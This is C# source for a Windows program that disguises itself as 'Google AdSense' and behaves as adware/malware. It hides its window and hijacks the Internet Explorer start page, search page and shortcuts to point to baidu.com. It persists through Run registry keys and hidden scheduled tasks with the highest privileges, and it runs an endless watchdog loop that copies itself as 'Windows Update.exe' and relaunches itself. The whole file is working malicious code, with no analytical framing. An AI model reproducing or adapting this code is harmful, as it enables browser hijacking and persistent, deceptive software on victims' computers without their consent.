using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Shell32;
using IWshRuntimeLibrary;

namespace Google_AdSense
{
    public partial class Google_AdSense : Form
    {
        public Google_AdSense()
        {
            InitializeComponent();
            Visible = false; // Hide window.
            ShowInTaskbar = false; // Remove from taskbar.

            // Environmental variables
            string appDataRoaming = Environment.GetEnvironmentVariable("appdata");
            string currentDirectory = Environment.CurrentDirectory;

            // Variable locations
            string ieTaskShortcut = appDataRoaming + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\";

            string adLoc = appDataRoaming + "\\Ads\\";
            string adSenseLoc = appDataRoaming + "\\Google\\AdSense\\";
            string winUpdLoc = appDataRoaming + "\\Microsoft\\Windows Update\\";

            string winUpdBuddyLoc = adSenseLoc + "bin\\";
            string newBuddy = winUpdLoc + "bin\\";

            // ON START

            // Registry keys
            RegistryKey baiduIE = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main", true);
            baiduIE.SetValue("Start Page", "http://www.baidu.com");
            baiduIE.SetValue("Search Page", "http://www.baidu.com");
            baiduIE.Close();
            RegistryKey adStartupRun = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            adStartupRun.SetValue("Funny Ad", adLoc + "Ad.exe");
            adStartupRun.Close();

            // Internet Explorer shortcut
            if (System.IO.File.Exists(ieTaskShortcut + "Internet Explorer.lnk"))
            {
                System.IO.File.Delete(ieTaskShortcut + "Internet Explorer.lnk");
            }
            
            var winScriptHost = new IWshShell_Class();
            IWshRuntimeLibrary.IWshShortcut shortcut = winScriptHost.CreateShortcut(ieTaskShortcut + "Internet Explorer.lnk") as IWshRuntimeLibrary.IWshShortcut;
            shortcut.TargetPath = @"C:\Program Files (x86)\Internet Explorer\iexplore.exe";
            shortcut.WorkingDirectory = @"C:\Program Files (x86)\Internet Explorer";
            shortcut.Arguments = "https://www.baidu.com";
            shortcut.Save();

            if (System.IO.File.Exists(Environment.GetEnvironmentVariable("userprofile") + "\\Desktop\\Internet Explorer.lnk"))
            {
                System.IO.File.Copy(ieTaskShortcut + "Internet Explorer.lnk", Environment.GetEnvironmentVariable("userprofile") + "\\Desktop\\Internet Explorer.lnk", true);
            }

            // Task Scheduler
            try
            {
                System.Diagnostics.Process process1 = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo1 = new System.Diagnostics.ProcessStartInfo();
                startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo1.FileName = "cmd.exe";
                startInfo1.Arguments = "/c schtasks /create /tn \"Baidu Ad\" /sc minute /mo 1 /f /rl highest /tr \"" + adLoc + "Ad.exe\"";
                process1.StartInfo = startInfo1;
                process1.Start();

                System.Diagnostics.Process process2 = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo2 = new System.Diagnostics.ProcessStartInfo();
                startInfo2.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo2.FileName = "cmd.exe";
                startInfo2.Arguments = "/c schtasks /create /tn \"GoogleUpdateTask\" /sc onlogon /f /rl highest /tr \"" + adSenseLoc + "Google AdSense.exe\"";
                process2.StartInfo = startInfo2;
                process2.Start();
               
            }
            catch (Exception)
            {
                
            }

            // MONITORING
            do
            {
                // Recreate Windows Update Exe if missing
                if (!System.IO.File.Exists(winUpdLoc + "Windows Update.exe"))
                {
                    if (!Directory.Exists(winUpdLoc))
                    {
                        Directory.CreateDirectory(winUpdLoc);
                    }
                    if (!Directory.Exists(winUpdLoc + "bin\\"))
                    {
                        Directory.CreateDirectory(winUpdLoc + "bin\\");
                    }
                    if (!System.IO.File.Exists(winUpdLoc + "Windows Update.exe"))
                    {
                        System.IO.File.Copy(winUpdBuddyLoc + "service.exe", winUpdLoc + "Windows Update.exe", true);
                    }
                    if (!System.IO.File.Exists(winUpdLoc + "bin\\service.exe"))
                    {
                        System.IO.File.Copy(adSenseLoc + "Google AdSense.exe", winUpdLoc + "bin\\service.exe", true);
                    }
                    
                }

                // Run Windows update if not running
                Process[] pname = Process.GetProcessesByName("Windows Update");
                if (pname.Length == 0)
                Process.Start(winUpdLoc + "Windows Update.exe");

                // Constantly re-write registry
                RegistryKey sense = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                sense.SetValue("Google", adSenseLoc + "Google AdSense.exe");
                sense.Close();

                // Optimize CPU utilization
                System.Threading.Thread.Sleep(2000);

            } while (true);
            
        }
    }
}
